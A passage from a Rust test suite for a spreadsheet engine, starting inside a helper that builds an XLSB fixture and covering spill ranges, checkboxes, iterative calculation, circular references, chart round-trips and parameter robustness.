    bundle.extend(wide("rId1"));
    bundle.extend(wide("Imported"));
    record(&mut book, 156, &bundle);
    record(&mut book, 144, &[]);
    record(&mut book, 132, &[]);
    let mut sheet = vec![];
    record(&mut sheet, 129, &[]); // BeginSheet
    record(&mut sheet, 145, &[]); // BeginSheetData
    record(&mut sheet, 0, &[0; 17]); // Row 0, no spans
    let mut numeric = vec![0; 8]; // A1, default style
    numeric.extend(42.0f64.to_le_bytes());
    numeric.extend([0; 2]); // Formula flags
    numeric.extend(3u32.to_le_bytes());
    numeric.extend([0x1e, 42, 0]); // PtgInt(42)
    numeric.extend(0u32.to_le_bytes());
    record(&mut sheet, 9, &numeric); // FmlaNum
    let mut text = 1u32.to_le_bytes().to_vec(); // B1
    text.extend(0u32.to_le_bytes());
    text.extend(wide("Original data"));
    record(&mut sheet, 6, &text);
    record(&mut sheet, 146, &[]);
    record(&mut sheet, 130, &[]);
    let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let types = br#"<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.bin" ContentType="application/vnd.ms-excel.sheet.binary.macroEnabled.main"/><Override PartName="/xl/worksheets/sheet1.bin" ContentType="application/vnd.ms-excel.worksheet"/></Types>"#;
    let rels = br#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.bin"/></Relationships>"#;
    let book_rels = br#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.bin"/></Relationships>"#;
    for (name, data) in [
        ("[Content_Types].xml", types.as_slice()),
        ("_rels/.rels", rels.as_slice()),
        ("xl/_rels/workbook.bin.rels", book_rels.as_slice()),
        ("xl/workbook.bin", book.as_slice()),
        ("xl/worksheets/sheet1.bin", sheet.as_slice()),
    ] {
        zip.start_file(name, zip::write::SimpleFileOptions::default()).unwrap();
        zip.write_all(data).unwrap();
    }
    zip.finish().unwrap().into_inner()
}

#[test]
fn replacing_a_spilling_formula_clears_its_spill() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(3)"})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "=SUM(A1:A3)"})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "2"})).unwrap();
    assert_eq!((v(&s, "A2"), v(&s, "A3"), v(&s, "B1")), (Value::Empty, Value::Empty, Value::Number(2.0)));
    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(3)"})).unwrap();
    s.execute("edit.clearContents", json!({"range": "A1"})).unwrap();
    assert_eq!((v(&s, "A2"), v(&s, "B1")), (Value::Empty, Value::Number(0.0)));
}

#[test]
fn clearing_a_spill_past_65536_cells_updates_a_late_dependent() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(65537)"})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "=A65536"})).unwrap();
    s.execute("cell.set", json!({"cell": "C2", "input": "=A65537"})).unwrap();
    assert_eq!(v(&s, "C2"), Value::Number(65537.0));
    s.execute("cell.set", json!({"cell": "A1", "input": "5"})).unwrap();
    assert_eq!((v(&s, "C1"), v(&s, "C2")), (Value::Number(0.0), Value::Number(0.0)));
}

#[test]
fn range_ending_in_index_recalculates() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "B6", "input": "=SUM(C3:INDEX(B9:C11,2,2))"})).unwrap();
    s.execute("cell.set", json!({"cell": "C5", "input": "2"})).unwrap();
    assert_eq!(v(&s, "B6"), Value::Number(2.0));
}

#[test]
fn structural_edits_move_spills_with_their_formula() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A5", "input": "=SEQUENCE(3)"})).unwrap();
    s.execute("home.deleteRows", json!({"rows": "1:1"})).unwrap();
    let col = |s: &Session| (4..=7).map(|r| v(s, &format!("A{r}"))).collect::<Vec<_>>();
    assert_eq!(col(&s), [Value::Number(1.0), Value::Number(2.0), Value::Number(3.0), Value::Empty]);
    s.execute("home.deleteRows", json!({"rows": "4:4"})).unwrap();
    assert_eq!(col(&s), [Value::Empty, Value::Empty, Value::Empty, Value::Empty]);
}

#[test]
fn clearing_a_distant_blocker_unblocks_the_spill() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(100)"})).unwrap();
    s.execute("cell.set", json!({"cell": "A90", "input": "x"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Error(gridcraft_core::CellError::Spill));
    s.execute("edit.clearContents", json!({"range": "A90"})).unwrap();
    assert_eq!((v(&s, "A1"), v(&s, "A100")), (Value::Number(1.0), Value::Number(100.0)));
}

#[test]
fn a_spill_that_goes_away_unblocks_another() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "F8", "input": "=SEQUENCE(5)"})).unwrap();
    s.execute("cell.set", json!({"cell": "E10", "input": "=SEQUENCE(1,3)"})).unwrap();
    assert_eq!(v(&s, "E10"), Value::Error(gridcraft_core::CellError::Spill));
    // Blocking F8's array frees F10 for E10's.
    s.execute("cell.set", json!({"cell": "F9", "input": "0"})).unwrap();
    assert_eq!(v(&s, "F8"), Value::Error(gridcraft_core::CellError::Spill));
    assert_eq!((v(&s, "E10"), v(&s, "G10")), (Value::Number(1.0), Value::Number(3.0)));
}

#[test]
fn a_contested_spill_area_stays_with_its_array_after_reopening() {
    // F13's array wants F14:G14, which C14's array already fills, so F13 is #SPILL!. The file
    // can only cache #VALUE! for it; reopening (which recalculates) used to hand the area to F13
    // for coming first in reading order.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "C14", "input": "=SEQUENCE(1,7)"})).unwrap();
    s.execute("cell.set", json!({"cell": "F13", "input": "=SEQUENCE(5,2)"})).unwrap();
    assert_eq!(v(&s, "F13"), Value::Error(gridcraft_core::CellError::Spill));
    let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    s.execute("file.open", json!({"name": "contested.xlsx", "base64": saved["base64"]})).unwrap();
    assert_eq!(v(&s, "F13"), Value::Error(gridcraft_core::CellError::Spill));
    assert_eq!((v(&s, "C14"), v(&s, "G14"), v(&s, "I14")), (Value::Number(1.0), Value::Number(5.0), Value::Number(7.0)));
}

#[test]
fn an_array_reading_another_arrays_spill_is_updated() {
    // G5 is evaluated before D11 in the same pass, so it first reads D11's old spill.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    s.execute("cell.set", json!({"cell": "D11", "input": "=SEQUENCE(1,3,A1)"})).unwrap();
    s.execute("cell.set", json!({"cell": "G5", "input": "=UNIQUE(VSTACK(F9:F12,A1))"})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "10"})).unwrap();
    assert_eq!((v(&s, "G6"), v(&s, "G7")), (Value::Number(12.0), Value::Number(10.0)));
    s.execute("formulas.calculateNow", json!({})).unwrap();
    assert_eq!((v(&s, "G6"), v(&s, "G7")), (Value::Number(12.0), Value::Number(10.0)));
}

#[test]
fn indirect_reads_a_spill_laid_out_in_the_same_pass() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "F5", "input": "=SEQUENCE(2,2,7)"})).unwrap();
    s.execute("home.insertRows", json!({"rows": "3:3"})).unwrap();
    s.execute("cell.set", json!({"cell": "E5", "input": "=INDIRECT(\"F7\")"})).unwrap();
    assert_eq!(v(&s, "E5"), Value::Number(9.0));
    s.execute("formulas.calculateNow", json!({})).unwrap();
    assert_eq!(v(&s, "E5"), Value::Number(9.0));
}

#[test]
fn inserting_rows_lays_out_spills_where_the_formulas_moved() {
    // D1's array grows with the inserted rows to D1:D10 and C10's array moves down to C12:E14:
    // the area C10:E12 it filled before the insertion blocks neither of them.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "D1", "input": "=SEQUENCE(ROWS(A2:A9))"})).unwrap();
    s.execute("cell.set", json!({"cell": "C8", "input": "=1"})).unwrap();
    s.execute("cell.set", json!({"cell": "C10", "input": "=SEQUENCE(3,3)"})).unwrap();
    s.execute("home.insertRows", json!({"rows": "3:4"})).unwrap();
    assert_eq!((v(&s, "D1"), v(&s, "D10")), (Value::Number(1.0), Value::Number(10.0)));
    assert_eq!((v(&s, "C12"), v(&s, "D12"), v(&s, "E14")), (Value::Number(1.0), Value::Number(2.0), Value::Number(9.0)));
}

#[test]
fn every_command_survives_empty_params() {
    let mut s = Session::new();
    s.execute("file.new", json!({"sample": "sales"})).unwrap();
    for spec in crate::command_specs() {
        if matches!(
            spec.id,
            "file.close" | "window.close" | "file.open" | "file.save" | "file.saveAs" | "file.exportCsv" | "file.exportHtml" | "insert.picture"
        ) {
            continue;
        }
        let _ = s.execute(spec.id, json!({}));
        let _ = s.execute(spec.id, json!([1, 2]));
        let _ = s.execute(spec.id, json!({"range": "ZZZ999999999", "cell": "", "sheet": 99}));
    }
}

#[test]
fn non_object_params_do_not_panic_in_wrapper_commands() {
    // Issue #516.
    for cmd in ["pageLayout.themeColors", "pageLayout.background", "home.drawBorder"] {
        for params in [json!([]), json!(5), json!("x"), json!(true)] {
            let mut s = s();
            let r = s.execute(cmd, params.clone());
            assert!(!matches!(r, Err(crate::EngineError::Internal(..))), "{cmd} {params}: {r:?}");
        }
    }
    // A saved script step forwards its params unchanged into the same call.
    let mut s = s();
    s.execute("automate.newScript", json!({"name": "bad", "commands": [{"command": "home.drawBorder", "params": []}]})).unwrap();
    let r = s.execute("automate.runScript", json!({"name": "bad"}));
    assert!(!matches!(r, Err(crate::EngineError::Internal(..))), "script: {r:?}");
}

fn fmt_of(s: &Session, a: &str) -> String {
    let wb = &s.doc().unwrap().wb;
    let sh = wb.active().unwrap();
    wb.styles.get(sh.style_id(CellRef::parse(a).unwrap())).num_fmt.as_str().to_string()
}

#[test]
fn checkboxes_keep_values_toggle_and_delete_in_two_passes() {
    // Issue #196.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "B1", "input": "hi"})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "TRUE"})).unwrap();
    s.execute("insert.checkbox", json!({"range": "A1:B2"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Bool(false), "an empty cell starts unchecked");
    assert_eq!(v(&s, "B1"), Value::from("hi"), "other values stay");
    s.execute("cell.toggleCheckbox", json!({"cell": "A1"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Bool(true));
    // Space over a selection toggles only checkbox cells; an emptied checkbox counts as FALSE.
    s.execute("cell.set", json!({"cell": "A2", "input": ""})).unwrap();
    s.execute("selection.set", json!({"range": "A2:C2"})).unwrap();
    s.execute("cell.toggleCheckbox", json!({})).unwrap();
    assert_eq!(v(&s, "A2"), Value::Bool(true));
    s.execute("selection.set", json!({"range": "C1"})).unwrap();
    s.execute("cell.toggleCheckbox", json!({})).unwrap();
    assert_eq!(v(&s, "C1"), Value::Bool(true), "a plain TRUE is not a checkbox");
    // Delete: checked boxes are unchecked first, then the boxes go.
    s.execute("edit.clearContents", json!({"range": "A1:A2"})).unwrap();
    assert_eq!((v(&s, "A1"), v(&s, "A2")), (Value::Bool(false), Value::Bool(false)));
    assert_eq!(fmt_of(&s, "A1"), "checkbox");
    s.execute("edit.clearContents", json!({"range": "A1:A2"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Empty);
    assert_ne!(fmt_of(&s, "A1"), "checkbox");
    // Clear Formats removes the box and keeps the value (B2 was checked by the selection toggle).
    s.execute("edit.clearFormats", json!({"range": "B2"})).unwrap();
    assert_eq!(v(&s, "B2"), Value::Bool(true));
    assert_ne!(fmt_of(&s, "B2"), "checkbox");
}

/// A checked box in a row the filter hides doesn't hold back Delete on the boxes showing, and
/// stays as it is (#1419).
#[test]
fn delete_on_filtered_checkboxes_skips_the_hidden_rows() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Status"], ["on"], ["off"], ["on"]]})).unwrap();
    s.execute("insert.checkbox", json!({"range": "B2:B4"})).unwrap();
    s.execute("cell.toggleCheckbox", json!({"cell": "B3"})).unwrap();
    s.execute("selection.set", json!({"cell": "A1"})).unwrap();
    s.execute("data.filter", json!({})).unwrap();
    s.execute("data.filterBy", json!({"column": "A", "values": ["on"]})).unwrap();
    s.execute("edit.clearContents", json!({"range": "B2:B4"})).unwrap();
    assert_ne!(fmt_of(&s, "B2"), "checkbox", "the unchecked boxes showing are removed at once");
    assert_ne!(fmt_of(&s, "B4"), "checkbox");
    assert_eq!(fmt_of(&s, "B3"), "checkbox");
    assert_eq!(v(&s, "B3"), Value::Bool(true));
}

#[test]
fn checkboxes_survive_xlsx_as_cell_controls() {
    let mut s = s();
    s.execute("insert.checkbox", json!({"range": "A1:A2"})).unwrap();
    s.execute("cell.toggleCheckbox", json!({"cell": "A1"})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "0.5"})).unwrap();
    reopen(&mut s);
    assert_eq!(fmt_of(&s, "A1"), "checkbox");
    assert_eq!(fmt_of(&s, "A2"), "checkbox");
    assert_eq!(fmt_of(&s, "B1"), "General");
    assert_eq!(v(&s, "A1"), Value::Bool(true));
    assert_eq!(v(&s, "A2"), Value::Bool(false));
}

#[test]
fn file_options_reports_settings_and_asks_for_the_options_page() {
    let mut s = Session::new();
    // No workbook: nothing to report, but still no error.
    assert_eq!(s.execute("file.options", json!({})).unwrap(), json!({"calculation": null}));
    s.take_ui_requests();
    s.new_workbook();
    s.execute("formulas.calculationOptions", json!({"mode": "manual", "iterative": true})).unwrap();
    let before = s.active().unwrap().wb.clone();
    let r = s.execute("file.options", json!({})).unwrap();
    assert_eq!(r["calculation"]["mode"], "manual");
    assert_eq!(r["calculation"]["iterative"], true);
    assert!(matches!(s.take_ui_requests().as_slice(), [crate::UiRequest::Dialog(name, _)] if name == "options"));
    assert_eq!(s.active().unwrap().wb, before, "Options never changes the workbook");
}

/// Ctrl+8 hides and shows the outline symbols; it's undoable and a sheet setting.
#[test]
fn show_outline_symbols_toggles() {
    let mut s = s();
    let on = |s: &Session| s.active().unwrap().wb.active().unwrap().show_outline_symbols;
    assert!(on(&s));
    assert_eq!(s.execute("view.showOutlineSymbols", json!({})).unwrap(), json!({"on": false}));
    assert!(!on(&s));
    s.execute("edit.undo", json!({})).unwrap();
    assert!(on(&s));
    s.execute("view.showOutlineSymbols", json!({"on": false})).unwrap();
    reopen(&mut s);
    assert!(!on(&s));
}

fn reopen(s: &mut Session) {
    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let b64 = r["base64"].as_str().unwrap().to_string();
    s.execute("file.open", json!({"name": "x.xlsx", "base64": b64})).unwrap();
}

#[test]
fn calculation_options_enable_iterative_calculation() {
    let mut s = s();
    let near = |s: &Session, a: &str, want: f64| {
        let got = v(s, a).as_f64().unwrap_or(f64::NAN);
        assert!((got - want).abs() < 0.002, "{a} = {:?}", v(s, a));
    };
    s.execute("cell.set", json!({"cell": "A1", "input": "=(A2+10)/2"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "=A1"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Error(gridcraft_core::CellError::Circ));
    assert!(!s.doc().unwrap().calc.circular.is_empty());
    // Switching it on recalculates the loop.
    let r = s.execute("formulas.calculationOptions", json!({"iterative": true})).unwrap();
    assert_eq!(r, json!({"mode": "Automatic", "iterative": true, "maxIterations": 100, "maxChange": 0.001, "precisionAsDisplayed": false}));
    near(&s, "A1", 10.0);
    near(&s, "A2", 10.0);
    assert!(s.doc().unwrap().calc.circular.is_empty());
    // Empty params change nothing and report the settings.
    let r = s.execute("formulas.calculationOptions", json!({})).unwrap();
    assert_eq!(r["iterative"], true);
    // Limits are kept within Excel's: 1–32767 iterations, a non-negative change.
    let r = s.execute("formulas.calculationOptions", json!({"maxIterations": 0, "maxChange": -0.5})).unwrap();
    assert_eq!((r["maxIterations"].as_u64(), r["maxChange"].as_f64()), (Some(1), Some(0.5)));
    let r = s.execute("formulas.calculationOptions", json!({"maxIterations": 100000, "maxChange": 0.0001})).unwrap();
    assert_eq!((r["maxIterations"].as_u64(), r["maxChange"].as_f64()), (Some(32767), Some(0.0001)));
    // Saved with the workbook.
    reopen(&mut s);
    let calc = s.doc().unwrap().wb.calc.clone();
    assert_eq!((calc.iterative, calc.max_iterations, calc.max_change), (true, 32767, 0.0001));
    near(&s, "A1", 10.0);
    // Undo brings the previous settings back.
    s.execute("formulas.calculationOptions", json!({"iterative": false})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Error(gridcraft_core::CellError::Circ));
    s.execute("edit.undo", json!({})).unwrap();
    assert!(s.doc().unwrap().wb.calc.iterative);
    near(&s, "A1", 10.0);
}

#[test]
fn error_checking_quotes_sheet_names_in_circular_references() {
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "Bob's Q1"})).unwrap();
    s.execute("cell.set", json!({"cell": "B2", "input": "=B2+1"})).unwrap();
    let r = s.execute("formulas.errorChecking", json!({})).unwrap();
    assert_eq!(r["circular"], json!(["'Bob''s Q1'!B2"]));
    // The reference reads back in a formula and in Go To.
    let reference = r["circular"][0].as_str().unwrap().to_string();
    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": format!("=ROW({reference})")})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(2.0));
    s.execute("edit.goTo", json!({"reference": reference})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!((d.wb.active_sheet(), d.selection.active.a1()), (1, "B2".to_string()));
}

/// Undo and redo put cells back without calculating them; the circular references listed are
/// those of the restored cells.
#[test]
fn undo_and_redo_list_the_circular_references_of_the_restored_cells() {
    let mut s = s();
    let listed = |s: &Session| s.doc().unwrap().calc.circular.iter().map(|(si, c)| (*si, c.a1())).collect::<Vec<_>>();
    s.execute("cell.set", json!({"cell": "A5", "input": "=A5+1"})).unwrap();
    assert_eq!(listed(&s), vec![(0, "A5".to_string())]);
    s.execute("home.insertRows", json!({"rows": "2"})).unwrap();
    assert_eq!(listed(&s), vec![(0, "A6".to_string())]);
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(listed(&s), vec![(0, "A5".to_string())]);
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(listed(&s), vec![(0, "A6".to_string())]);
    // Undoing the loop itself lists none.
    s.execute("edit.undo", json!({"steps": 2})).unwrap();
    assert!(listed(&s).is_empty());
}

fn chart_data(s: &mut Session) {
    s.execute(
        "range.setValues",
        json!({"range": "A1", "values": [["", "Open", "High", "Low", "Close"], ["Mon", 10, 14, 9, 12], ["Tue", 12, 15, 11, 14], ["Wed", 14, 16, 10, 11], ["Thu", 11, 13, 8, 9], ["Fri", 9, 12, 7, 11], ["Sat", 11, 15, 10, 14]]}),
    )
    .unwrap();
}

#[test]
fn every_chart_kind_survives_xlsx() {
    use gridcraft_model::ChartKind;
    let kinds = [
        ("combo", ChartKind::Combo),
        ("stock", ChartKind::Stock),
        ("histogram", ChartKind::Histogram),
        ("boxWhisker", ChartKind::BoxWhisker),
        ("waterfall", ChartKind::Waterfall),
        ("funnel", ChartKind::Funnel),
        ("treemap", ChartKind::Treemap),
        ("sunburst", ChartKind::Sunburst),
        ("column", ChartKind::ColumnClustered),
        ("line", ChartKind::Line),
        ("scatter", ChartKind::Scatter),
    ];
    for (t, kind) in kinds {
        let mut s = s();
        chart_data(&mut s);
        s.execute("insert.chart", json!({"type": t, "range": "A1:E7", "title": "Week"})).unwrap();
        let before = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
        assert_eq!(before.kind, kind);
        reopen(&mut s);
        assert!(s.doc().unwrap().wb.names.is_empty(), "{t}");
        let after = &s.doc().unwrap().wb.active().unwrap().charts[0];
        assert_eq!(after.kind, kind, "{t}");
        assert_eq!(after.title.as_deref(), Some("Week"), "{t}");
        assert_eq!(after.series.len(), before.series.len(), "{t}");
        for (a, b) in after.series.iter().zip(&before.series) {
            assert_eq!((&a.name, &a.values, &a.color), (&b.name, &b.values, &b.color), "{t}");
            // A histogram bins its values; it has no categories in the file.
            if kind != ChartKind::Histogram {
                assert_eq!(a.categories, b.categories, "{t}");
            }
        }
    }
}

#[test]
fn chart_set_doughnut_hole_and_angle() {
    let mut s = s();
    chart_data(&mut s);
    s.execute("insert.chart", json!({"type": "doughnut", "range": "A1:B7"})).unwrap();
    s.execute("chart.set", json!({"holeSize": 5, "firstSliceAngle": 400})).unwrap();
    s.execute("chart.set", json!({"holeSize": 200})).unwrap();
    let c = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
    assert_eq!((c.hole_size, c.first_slice_angle), (90, 40));
    s.execute("chart.set", json!({"holeSize": 25, "firstSliceAngle": 180})).unwrap();
    reopen(&mut s);
    let c = &s.doc().unwrap().wb.active().unwrap().charts[0];
    assert_eq!((c.kind, c.hole_size, c.first_slice_angle), (gridcraft_model::ChartKind::Doughnut, 25, 180));
}

#[test]
fn scatter_of_two_columns_is_one_series_with_the_first_as_x() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["X", "Y"], [1, 10], [2, 20], [3, 30]]})).unwrap();
    s.execute("insert.chart", json!({"type": "scatter", "range": "A1:B4"})).unwrap();
    let c = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
    assert_eq!(c.series.len(), 1);
    assert_eq!(c.series[0].values, "Sheet1!$B$2:$B$4");
    assert_eq!(c.series[0].categories.as_deref(), Some("Sheet1!$A$2:$A$4"));
    // Select Data on the scatter chart and Switch Row/Column rebuild the series the same way.
    s.execute("chart.selectData", json!({"range": "A2:B4"})).unwrap();
    let c = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
    assert_eq!(c.series.len(), 1);
    assert_eq!(c.series[0].categories.as_deref(), Some("Sheet1!$A$2:$A$4"));
    s.execute("range.setValues", json!({"range": "D1", "values": [[1, 2, 3, 4], [10, 20, 30, 40]]})).unwrap();
    s.execute("chart.selectData", json!({"range": "D1:G2"})).unwrap();
    s.execute("chart.switchRowColumn", json!({})).unwrap();
    s.execute("chart.switchRowColumn", json!({})).unwrap();
    let c = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
    assert!(c.by_rows);
    assert_eq!(c.series.len(), 1);
    assert_eq!(c.series[0].values, "Sheet1!$D$2:$G$2");
    assert_eq!(c.series[0].categories.as_deref(), Some("Sheet1!$D$1:$G$1"));
}

#[test]
fn whole_sheet_selection_stays_within_the_data() {
    // On an empty sheet with everything selected these filled or scanned every cell of the
    // sheet, running out of memory or time.
    let mut s = s();
    s.execute("edit.selectAll", json!({})).unwrap();
    for cmd in ["edit.fillDown", "edit.fillRight", "edit.fillUp", "edit.fillLeft", "data.removeDuplicates"] {
        s.execute(cmd, json!({})).unwrap();
    }
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2], [3, 4], [5, 6]]})).unwrap();
    s.execute("selection.set", json!({"range": "A1:XFD1048576"})).unwrap();
    s.execute("edit.fillUp", json!({})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(5.0));
    assert!(s.execute("edit.fillDown", json!({"range": "A1:Z1000000"})).is_err(), "too large to fill");
    assert!(s.execute("edit.autoFill", json!({"source": "A1:XFD1048576", "target": "A1"})).is_err(), "too large to fill");
    s.execute("range.setValues", json!({"range": "D1", "values": [[1], [1], [2]]})).unwrap();
    let r = s.execute("data.removeDuplicates", json!({"range": "D:D", "header": false})).unwrap();
    assert_eq!((r["removed"].clone(), r["remaining"].clone()), (json!(1), json!(2)));
    assert!(s.execute("data.removeDuplicates", json!({"range": "A1:XFD1048576", "header": false})).is_ok());
}

#[test]
fn whole_columns_and_rows_ignore_merges_but_cell_ranges_take_them_whole() {
    // As in Excel: a merged A2:C2 doesn't widen a click on column B's header to A:C, nor a
    // merged B2:B4 a click on row 3's header to rows 2:4; a cell range still takes them whole.
    let mut s = s();
    s.execute("home.mergeCenter", json!({"range": "A2:C2"})).unwrap();
    s.execute("home.mergeCenter", json!({"range": "E2:E4"})).unwrap();
    let sel = |s: &mut Session, range: &str| s.execute("selection.set", json!({"range": range})).unwrap()["selection"].clone();
    assert_eq!(sel(&mut s, "B:B"), "B:B");
    assert_eq!(sel(&mut s, "A:B"), "A:B");
    assert_eq!(sel(&mut s, "3:3"), "3:3");
    assert_eq!(sel(&mut s, "B1:B3"), "A1:C3");
    assert_eq!(sel(&mut s, "E3"), "E2:E4");
}

#[test]
fn parity_counts() {
    let (done, total) = crate::catalog::parity();
    assert!(total > 250);
    assert!(done > 150, "parity {done}/{total}");
}

#[test]
fn switch_row_column_on_a_chart_read_from_a_file() {
    let mut s = s();
    s.execute(
        "range.setValues",
        json!({"range": "A1", "values": [["", "North", "South", "East", "West"], ["Mon", 10, 14, 9, 12], ["Tue", 12, 15, 11, 14], ["Wed", 14, 16, 10, 11], ["Thu", 11, 13, 8, 9], ["Fri", 9, 12, 7, 11], ["Sat", 11, 15, 10, 14]]}),
    )
    .unwrap();
    s.execute("insert.chart", json!({"type": "column", "range": "A1:E7"})).unwrap();
    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let b64 = r["base64"].as_str().unwrap().to_string();
    s.execute("file.open", json!({"name": "x.xlsx", "base64": b64})).unwrap();
    let chart = |s: &Session| s.doc().unwrap().wb.active().unwrap().charts[0].clone();
    assert_eq!((chart(&s).source, chart(&s).series.len()), (None, 4));
    s.execute("chart.switchRowColumn", json!({})).unwrap();
    let c = chart(&s);
    assert!(c.by_rows);
    assert_eq!(c.source.as_deref(), Some("Sheet1!A1:E7"));
    assert_eq!(c.series.len(), 6);
    assert_eq!(c.series[0].name.as_deref(), Some("Sheet1!$A$2"));
    assert_eq!(c.series[0].categories.as_deref(), Some("Sheet1!$B$1:$E$1"));
    assert_eq!(c.series[0].values, "Sheet1!$B$2:$E$2");
    s.execute("chart.switchRowColumn", json!({})).unwrap();
    assert_eq!(chart(&s).series.len(), 4);
}

#[test]
fn chart_trendlines_are_added_saved_and_removed() {
    use gridcraft_model::TrendlineKind;
    let mut s = s();
    chart_data(&mut s);
    s.execute("insert.chart", json!({"type": "line", "range": "A1:E7"})).unwrap();
    let chart = |s: &Session| s.doc().unwrap().wb.active().unwrap().charts[0].clone();
    s.execute("chart.addElement", json!({"element": "trendline", "series": 1, "type": "linearForecast", "displayEquation": true})).unwrap();
    s.execute("chart.addElement", json!({"element": "trendline", "series": 1, "type": "polynomial", "order": 9})).unwrap();
    s.execute("chart.addElement", json!({"element": "trendline", "series": 3, "type": "movingAverage", "period": 3})).unwrap();
    let c = chart(&s);
    assert!(c.series[0].trendlines.is_empty());
    let t = &c.series[1].trendlines;
    assert_eq!((t.len(), t[0].kind, t[0].forward, t[0].display_equation), (2, TrendlineKind::Linear, 2.0, true));
    assert_eq!(t[1].kind, TrendlineKind::Polynomial(6), "order clamps to Excel's 2..6");
    assert_eq!(c.series[3].trendlines[0].kind, TrendlineKind::MovingAverage(3));
    let info = s.execute("document.inspect", json!({})).unwrap();
    assert_eq!(info["sheets"][0]["charts"][0]["trendlines"], json!(["Linear", "Polynomial(6)", "MovingAverage(3)"]));
    assert!(s.execute("chart.addElement", json!({"element": "trendline", "series": 9})).is_err());
    assert!(s.execute("chart.addElement", json!({"element": "trendline", "type": "cubic"})).is_err());
    reopen(&mut s);
    let after = chart(&s);
    assert_eq!(after.series[1].trendlines, c.series[1].trendlines);
    assert_eq!(after.series[3].trendlines, c.series[3].trendlines);
    s.execute("chart.addElement", json!({"element": "trendline", "on": false})).unwrap();
    assert!(chart(&s).series.iter().all(|se| se.trendlines.is_empty()));
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(chart(&s).series[1].trendlines.len(), 2);
}

#[test]
fn trendlines_are_refused_on_charts_that_cannot_show_them() {
    let mut s = s();
    chart_data(&mut s);
    s.execute("insert.chart", json!({"type": "pie", "range": "A1:B7"})).unwrap();
    assert!(s.execute("chart.addElement", json!({"element": "trendline"})).is_err());
    assert!(s.doc().unwrap().wb.active().unwrap().charts[0].series[0].trendlines.is_empty());
}

#[test]
fn switch_row_column_with_whole_column_refs_is_bounded() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["", "North", "South"], ["Mon", 10, 14], ["Tue", 12, 15], ["Wed", 14, 16]]}))
        .unwrap();
    s.execute("insert.chart", json!({"type": "column", "range": "A1:C4"})).unwrap();
    // As read from a file: no source block, series over whole columns.
    let whole = |s: &mut Session| {
        let c = &mut std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap().charts[0];
        c.source = None;
        c.by_rows = false;
        c.series.truncate(2);
        for (i, col) in ["B", "C"].iter().enumerate() {
            c.series[i].name = None;
            c.series[i].categories = Some("Sheet1!$A:$A".into());
            c.series[i].values = format!("Sheet1!${col}:${col}");
        }
    };
    whole(&mut s);
    s.execute("chart.switchRowColumn", json!({})).unwrap();
    let c = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
    assert!(c.by_rows);
    // Clipped to the used rows, not a million series.
    assert_eq!(c.series.len(), 3);
    // A used range that is itself enormous is refused rather than charted.
    s.execute("cell.set", json!({"cell": "C1048576", "input": "1"})).unwrap();
    whole(&mut s);
    assert!(s.execute("chart.switchRowColumn", json!({})).is_err());
    assert_eq!(s.doc().unwrap().wb.active().unwrap().charts[0].series.len(), 2);
}

#[test]
fn switch_row_column_follows_inserted_and_deleted_lines() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["", "Q1", "Q2"], ["North", 1, 2], ["South", 3, 4]]})).unwrap();
    s.execute("insert.chart", json!({"range": "A1:C3", "type": "column", "at": "F1"})).unwrap();
